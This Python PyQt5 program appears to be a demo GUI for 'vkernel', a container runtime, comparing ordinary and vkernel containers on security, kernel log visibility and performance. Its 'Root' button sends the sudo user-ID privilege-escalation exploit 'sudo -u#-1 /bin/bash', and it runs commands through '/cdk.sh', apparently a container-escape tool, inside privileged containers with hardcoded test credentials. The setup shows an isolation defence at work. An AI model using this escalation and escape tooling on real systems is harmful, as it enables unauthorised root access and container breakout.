import sys
import time

from PyQt5 import QtWidgets, QtGui, QtCore
from PyQt5.QtCore import Qt
import paramiko


class PresentationApp(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.cve_app = CveApp()
        self.dmesg_app = DmesgApp()
        self.performance_app = PerformanceApp()

        self.setWindowTitle('vkernel Presentation')
        self.setGeometry(100, 100, 400, 200)

        layout = QtWidgets.QVBoxLayout()

        button0 = QtWidgets.QToolButton(self)
        button0.clicked.connect(self.display1)
        button0.setIcon(QtGui.QIcon('security.png'))
        button0.setIconSize(QtCore.QSize(128, 128))
        button0.setText('Security')
        button0.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(button0, alignment=QtCore.Qt.AlignCenter)

        button1 = QtWidgets.QToolButton(self)
        button1.clicked.connect(self.display2)
        button1.setIcon(QtGui.QIcon('vs.png'))
        button1.setIconSize(QtCore.QSize(128, 128))
        button1.setText("VS")
        button1.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(button1, alignment=QtCore.Qt.AlignCenter)

        button2 = QtWidgets.QToolButton(self)
        button2.clicked.connect(self.display3)
        button2.setIcon(QtGui.QIcon('performance.png'))
        button2.setIconSize(QtCore.QSize(128, 128))
        button2.setText("Performance")
        button2.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(button2, alignment=QtCore.Qt.AlignCenter)

        self.setLayout(layout)

    def display1(self):
        self.cve_app.show()

    def display2(self):
        self.dmesg_app.show()

    def display3(self):
        self.performance_app.show()


class DmesgApp(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.name = ""
        self.client = None
        self.setWindowTitle('Dmesg Presentation')
        self.setGeometry(800, 800, 1600, 1600)

        # Create the main layout with 1 row and 2 columns
        main_layout = QtWidgets.QHBoxLayout()

        # Create the layout for the first column
        column1_layout = QtWidgets.QVBoxLayout()

        self.create_container_button = QtWidgets.QPushButton('Create Container', self)
        self.create_container_button.clicked.connect(lambda _, flag=False: self.create_container(flag))
        column1_layout.addWidget(self.create_container_button)

        self.execute_command_button = QtWidgets.QPushButton('Execute Command', self)
        self.execute_command_button.clicked.connect(lambda _, flag=False: self.execute_command(flag))
        column1_layout.addWidget(self.execute_command_button)

        self.command_output_textbox = QtWidgets.QPlainTextEdit(self)
        column1_layout.addWidget(self.command_output_textbox)

        # Create the layout for the second column
        column2_layout = QtWidgets.QVBoxLayout()

        self.create_container_button2 = QtWidgets.QPushButton('Create Container', self)
        self.create_container_button2.clicked.connect(lambda _, flag=True: self.create_container(flag))
        column2_layout.addWidget(self.create_container_button2)

        self.execute_command_button2 = QtWidgets.QPushButton('Execute Command', self)
        self.execute_command_button2.clicked.connect(lambda _, flag=True: self.execute_command(flag))
        column2_layout.addWidget(self.execute_command_button2)

        self.command_output_textbox2 = QtWidgets.QPlainTextEdit(self)
        column2_layout.addWidget(self.command_output_textbox2)

        # Add both column layouts to the main layout
        main_layout.addLayout(column1_layout)
        main_layout.addLayout(column2_layout)

        self.setLayout(main_layout)

    def connect_container(self, flag):
        try:
            if self.client is not None:
                self.client.close()
                self.client = None
            self.client = paramiko.SSHClient()
            self.client.load_system_host_keys()
            self.client.set_missing_host_key_policy(paramiko.WarningPolicy())

            remote_host = '127.0.0.1'
            username = 'testuser'
            password = 'testuser'

            if flag:
                p = 7777
            else:
                p = 6666

            self.client.connect(hostname=remote_host, username=username, password=password, port=p)
        except paramiko.AuthenticationException:
            QtWidgets.QMessageBox.critical(self, '进入容器失败', '认证失败，请检查用户名和密码。')
        except Exception as e:
            QtWidgets.QMessageBox.critical(self, '进入容器失败', f"无法进入容器: {e}")

    def create_container(self, flag):
        if flag:
            self.name = "vkernel1"
            command = (f"docker run --rm -d --name {self.name} -p 7777:22 --privileged --runtime=vkernel-runtime "
                       f"vkernel-cve")
        else:
            self.name = "normal"
            command = f"docker run --rm -d --name {self.name} -p 6666:22 --privileged vkernel-cve"

        process = QtCore.QProcess(self)
        process.setProcessChannelMode(QtCore.QProcess.MergedChannels)

        process.start(command)
        process.waitForFinished()

        # Check if there was an error during the command execution
        if process.exitStatus() != QtCore.QProcess.NormalExit:
            error_message = "Error occurred while executing the command."
            msg_box = QtWidgets.QMessageBox(self)
            msg_box.setWindowTitle('Command Error')
            msg_box.setText("Error:")
            msg_box.setInformativeText(error_message)
            msg_box.setIcon(QtWidgets.QMessageBox.Critical)
            msg_box.exec_()
            return

        output = process.readAll().data().decode()

        # Show the command output in a QMessageBox
        msg_box = QtWidgets.QMessageBox(self)
        msg_box.setWindowTitle('Command Output')
        msg_box.setText("Command Output:")
        msg_box.setInformativeText(output)
        msg_box.setIcon(QtWidgets.QMessageBox.Information)
        msg_box.exec_()

    def execute_command(self, flag):
        self.connect_container(flag)
        if flag:
            output_textbox = self.command_output_textbox2
        else:
            output_textbox = self.command_output_textbox
        output_textbox.clear()
        stdin, stdout, stderr = self.client.exec_command('dmesg')
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        if output:
            print(f"Output from remote host: {output}")
            output_textbox.setPlainText(output)
        elif error:
            print(f"Error from remote host: {error}")
            output_textbox.setPlainText(error)
        self.client.close()


class PerformanceApp(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.url = 'https://www.baidu.com'
        self.setWindowTitle('Performance Presentation')
        self.setGeometry(100, 100, 400, 200)

        layout = QtWidgets.QVBoxLayout()

        button0 = QtWidgets.QToolButton(self)
        button0.clicked.connect(self.show_web)
        button0.setIcon(QtGui.QIcon('web.png'))
        button0.setIconSize(QtCore.QSize(128, 128))
        button0.setText('web')
        button0.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(button0, alignment=QtCore.Qt.AlignCenter)

        button1 = QtWidgets.QToolButton(self)
        button1.clicked.connect(lambda _, s='nginx': self.execute_scripts(s))
        button1.setIcon(QtGui.QIcon('nginx.png'))
        button1.setIconSize(QtCore.QSize(128, 128))
        button1.setText("nginx")
        button1.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(button1, alignment=QtCore.Qt.AlignCenter)

        button2 = QtWidgets.QToolButton(self)
        button2.clicked.connect(lambda _, s='pwgen': self.execute_scripts(s))
        button2.setIcon(QtGui.QIcon('pwgen.png'))
        button2.setIconSize(QtCore.QSize(128, 128))
        button2.setText("pwgen")
        button2.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(button2, alignment=QtCore.Qt.AlignCenter)

        self.setLayout(layout)

    def show_web(self):
        QtGui.QDesktopServices.openUrl(QtCore.QUrl(self.url))

    def execute_scripts(self, s):
        if s == 'nginx':
            command = "./nginx.sh"
        else:
            command = "./pwgen.sh"
        process = QtCore.QProcess(self)
        process.setProcessChannelMode(QtCore.QProcess.MergedChannels)

        process.start(command)
        process.waitForFinished()


class CveApp(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Security Presentation')
        self.setGeometry(100, 100, 400, 200)

        layout = QtWidgets.QVBoxLayout()

        button0 = QtWidgets.QToolButton(self)
        button0.clicked.connect(self.create_container)
        button0.setIcon(QtGui.QIcon('Create a container.png'))
        button0.setIconSize(QtCore.QSize(128, 128))
        button0.setText('Create container')
        button0.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(button0, alignment=QtCore.Qt.AlignCenter)

        button1 = QtWidgets.QToolButton(self)
        button1.clicked.connect(self.entry_container)
        button1.setIcon(QtGui.QIcon('enter.png'))
        button1.setIconSize(QtCore.QSize(128, 128))
        button1.setText("Entry container")
        button1.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(button1, alignment=QtCore.Qt.AlignCenter)

        self.button2 = QtWidgets.QToolButton(self)
        self.button2.clicked.connect(self.button2_clicked)
        self.button2.setIconSize(QtCore.QSize(128, 128))
        # button1.setText("Build vkernel")
        self.button2.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        layout.addWidget(self.button2, alignment=QtCore.Qt.AlignCenter)

        self.setLayout(layout)

        self.name = ""

        self.flag = False
        self.update_button_icon()

    def create_container(self):
        if self.flag:
            self.name = "vkernel"
            command = (f"docker run --rm -d --name {self.name} -p 3333:22 --privileged --runtime=vkernel-runtime "
                       f"vkernel-cve")
        else:
            self.name = "cve"
            command = f"docker run --rm -d --name {self.name} -p 2222:22 --privileged vkernel-cve"

        process = QtCore.QProcess(self)
        process.setProcessChannelMode(QtCore.QProcess.MergedChannels)

        process.start(command)
        process.waitForFinished()

        # Check if there was an error during the command execution
        if process.exitStatus() != QtCore.QProcess.NormalExit:
            error_message = "Error occurred while executing the command."
            msg_box = QtWidgets.QMessageBox(self)
            msg_box.setWindowTitle('Command Error')
            msg_box.setText("Error:")
            msg_box.setInformativeText(error_message)
            msg_box.setIcon(QtWidgets.QMessageBox.Critical)
            msg_box.exec_()
            return

        output = process.readAll().data().decode()

        # Show the command output in a QMessageBox
        msg_box = QtWidgets.QMessageBox(self)
        msg_box.setWindowTitle('Command Output')
        msg_box.setText("Command Output:")
        msg_box.setInformativeText(output)
        msg_box.setIcon(QtWidgets.QMessageBox.Information)
        msg_box.exec_()

    def button2_clicked(self):
        if self.flag:
            self.flag = False
            # QtWidgets.QMessageBox.critical(self, 'Close', 'close')
        else:
            self.flag = True
            # QtWidgets.QMessageBox.critical(self, 'Open', 'open')
        self.update_button_icon()

    def update_button_icon(self):
        if self.flag:
            self.button2.setIcon(QtGui.QIcon('close.png'))
            self.button2.setText("Close vkernel")
        else:
            self.button2.setIcon(QtGui.QIcon('open.png'))
            self.button2.setText("Open vkernel")

    def entry_container(self):
        remote_command_app = ContainerCommandApp(self.name, self.flag)
        remote_command_app.show()


class ContainerCommandApp(QtWidgets.QWidget):
    def __init__(self, name, flag):
        super().__init__()
        self.name = name
        self.flag = flag
        self.client = None
        self.channel = None
        self.connect_container()

        self.setWindowTitle('Container')
        self.setGeometry(100, 100, 400, 300)

        # Create the main layout with 3 rows
        main_layout = QtWidgets.QVBoxLayout()

        # Create the grid layout for the buttons
        button_layout = QtWidgets.QGridLayout()
        main_layout.addLayout(button_layout)

        row, col = 0, 0
        button = QtWidgets.QToolButton(self)
        button.clicked.connect(self.upgrade_to_root)
        button.setIcon(QtGui.QIcon('user_root.png'))
        button.setIconSize(QtCore.QSize(128, 128))
        button.setText('Root')
        button.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
        button_layout.addWidget(button, row, col)

        # Create 5 buttons and add them to the grid layout
        buttons = [
            {"text": "Who am I", "icon": "who.png", "command": "id"},
            {"text": "Create", "icon": "file.png", "command": "touch /tmp/test_dir/key.txt"},
            {"text": "Ps", "icon": "linux.png", "command": "ps"},
            {"text": "Button 4", "icon": "linux.png", "command": ""},
            {"text": "Button 5", "icon": "linux.png", "command": "command5"}
        ]

        col += 1
        for button_info in buttons:
            button = QtWidgets.QToolButton(self)
            button.clicked.connect(lambda _, cmd=button_info["command"]: self.execute_command(cmd))
            button.setIcon(QtGui.QIcon(button_info["icon"]))
            button.setIconSize(QtCore.QSize(128, 128))
            button.setText(button_info["text"])
            button.setToolButtonStyle(QtCore.Qt.ToolButtonTextUnderIcon)
            button_layout.addWidget(button, row, col)
            col += 1
            if col >= 2:
                col = 0
                row += 1

        # Create the text input and execute button for other commands
        input_layout = QtWidgets.QHBoxLayout()
        main_layout.addLayout(input_layout)

        self.command_input = QtWidgets.QLineEdit(self)
        input_layout.addWidget(self.command_input)

        execute_button = QtWidgets.QPushButton('Execute', self)
        execute_button.clicked.connect(self.execute_other_command)
        input_layout.addWidget(execute_button)

        self.setLayout(main_layout)

        self.first = True

    def connect_container(self):
        try:
            self.client = paramiko.SSHClient()
            self.client.load_system_host_keys()
            self.client.set_missing_host_key_policy(paramiko.WarningPolicy())

            remote_host = '127.0.0.1'
            username = 'testuser'
            password = 'testuser'

            if self.flag:
                p = 3333
            else:
                p = 2222

            self.client.connect(hostname=remote_host, username=username, password=password, port=p)

            # 使用paramiko.Channel和paramiko.invoke_shell实现交互式shell会话
            self.channel = self.client.invoke_shell()
            time.sleep(3)
            output = ""
            while not self.channel.recv_ready():
                continue
            while self.channel.recv_ready():
                output += self.channel.recv(65535).decode()
            print(output)
        except paramiko.AuthenticationException:
            QtWidgets.QMessageBox.critical(self, '进入容器失败', '认证失败，请检查用户名和密码。')
        except Exception as e:
            QtWidgets.QMessageBox.critical(self, '进入容器失败', f"无法进入容器: {e}")

    def upgrade_to_root(self):
        while self.channel.recv_ready():
            self.channel.recv(65535).decode()

        self.channel.send("sudo -u#-1 /bin/bash\n")
        output = ""
        while not self.channel.recv_ready():
            continue
        while self.channel.recv_ready():
            output += self.channel.recv(65535).decode()
        if self.first:
            if 'Operation not permitted' in output:
                QtWidgets.QMessageBox.critical(self, 'Failed', '切换到root用户失败。')
                return
            else:
                QtWidgets.QMessageBox.information(self, 'Succeed', '成功切换到root用户。')

    def execute_command(self, command):
        print(command)
        if not self.first and command != 'id':
            self.client.close()
            self.client = None
            self.channel = None
            process = QtCore.QProcess(self)
            process.setProcessChannelMode(QtCore.QProcess.MergedChannels)

            process.start(f'docker restart {self.name}')
            process.waitForFinished()
            time.sleep(1)
            self.connect_container()
            self.upgrade_to_root()
        elif command != 'id':
            self.first = False

        if command != 'id':
            command = f"chmod +x /cdk.sh && /cdk.sh \"{command}\""

        while self.channel.recv_ready():
            self.channel.recv(65535).decode()
        self.channel.send(f"{command}\n")
        time.sleep(3)
        output = ""
        while not self.channel.recv_ready():
            continue
        while self.channel.recv_ready():
            output += self.channel.recv(65535).decode()
        print(output)
        if command == "id":
            if "root" in output:
                QtWidgets.QMessageBox.information(self, 'root', 'I am root')
            else:
                QtWidgets.QMessageBox.information(self, 'testuser', 'I am testuser')
        else:
            time.sleep(1)
            output = ""
            while not self.channel.recv_ready():
                continue
            while self.channel.recv_ready():
                output += self.channel.recv(65535).decode()
            print(output)
            if output == '':
                QtWidgets.QMessageBox.critical(self, 'Failed', f'{output}\n')
            else:
                QtWidgets.QMessageBox.information(self, 'Succeed', f'{output}\n')

    def execute_other_command(self):
        command = self.command_input.text()
        self.execute_command(command)

    def closeEvent(self, event):
        if self.client is not None:
            self.client.close()
            self.client = None


if __name__ == '__main__':
    app = QtWidgets.QApplication(sys.argv)
    presentation_app = PresentationApp()
    presentation_app.show()
    sys.exit(app.exec_())
